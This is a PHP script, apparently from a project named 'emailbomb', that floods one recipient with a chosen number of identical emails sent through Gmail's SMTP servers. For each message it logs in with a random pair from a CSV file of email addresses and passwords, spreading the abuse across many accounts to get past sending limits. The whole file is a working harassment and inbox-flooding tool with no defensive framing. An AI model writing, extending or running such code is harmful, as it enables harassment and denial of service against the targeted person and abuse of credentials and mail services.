<?php

require '/storage/emulated/0/emailbomb/src/PHPMailer.php';
require '/storage/emulated/0/emailbomb/src/SMTP.php';
require '/storage/emulated/0/emailbomb/src/Exception.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

// Function to read credentials from a CSV file
function readCredentials($csvFile) {
    $credentials = [];
    if (($handle = fopen($csvFile, 'r')) !== false) {
        while (($data = fgetcsv($handle, 1000, ',')) !== false) {
            if (count($data) === 2) {
                $credentials[] = [
                    'email' => $data[0],
                    'password' => $data[1]
                ];
            }
        }
        fclose($handle);
    }
    return $credentials;
}

// Function to select a random email from the credentials
function getRandomCredential($credentials) {
    $randomIndex = array_rand($credentials);
    return $credentials[$randomIndex];
}

// Retrieve form data
$receiver = $_POST['receiver'] ?? '';
$subject = $_POST['subject'] ?? '';
$message = $_POST['message'] ?? '';
$count = $_POST['count'] ?? 0;

// Validate form data
if (empty($receiver) || empty($subject) || empty($message) || !is_numeric($count) || $count <= 0) {
    die('Error: Invalid form data');
}

// Retrieve credentials from the CSV file
$credentialsFile = '/storage/emulated/0/emailbomb/credentials.csv';
$credentials = readCredentials($credentialsFile);

// Configure PHPMailer
$mail = new PHPMailer(true);
$mail->SMTPDebug = 0;
$mail->isSMTP();
$mail->Host = 'smtp.gmail.com';
$mail->SMTPAuth = true;
$mail->SMTPSecure = 'tls';
$mail->Port = 587;

try {
    // Send emails with a randomly selected credential
    for ($i = 0; $i < $count; $i++) {
        $randomCredential = getRandomCredential($credentials);
        $email = $randomCredential['email'];
        $password = $randomCredential['password'];

        $mail->Username = $email;
        $mail->Password = $password;

        $mail->setFrom($email);
        $mail->addAddress($receiver);
        $mail->isHTML(false);
        $mail->Subject = $subject;
        $mail->Body = $message;

        $mail->send();
        echo "Email sent successfully using $email";
    }
    
    // Add JavaScript to reload the page after sending one email
    echo "Done.";
} catch (Exception $e) {
    echo "Error: {$mail->ErrorInfo}";
}
?>